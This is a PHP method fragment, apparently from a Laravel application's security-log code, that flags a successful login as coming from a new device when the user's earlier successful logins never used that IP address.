    private function isNewDeviceForUser(SecurityLog $log): bool
    {
        if (! $log->user_id || ! $log->ip_address || $log->tipe !== SecurityLog::TIPE_LOGIN_SUKSES) {
            return false;
        }

        $hasHistory = SecurityLog::query()
            ->where('user_id', $log->user_id)
            ->where('tipe', SecurityLog::TIPE_LOGIN_SUKSES)
            ->where('id', '!=', $log->id)
            ->where('ip_address', '!=', '')
            ->whereNotNull('ip_address')
            ->exists();

        $seenBefore = SecurityLog::query()
            ->where('user_id', $log->user_id)
            ->where('tipe', SecurityLog::TIPE_LOGIN_SUKSES)
            ->where('id', '!=', $log->id)
            ->where('ip_address', $log->ip_address)
            ->exists();

        return $hasHistory && ! $seenBefore;
    }
}
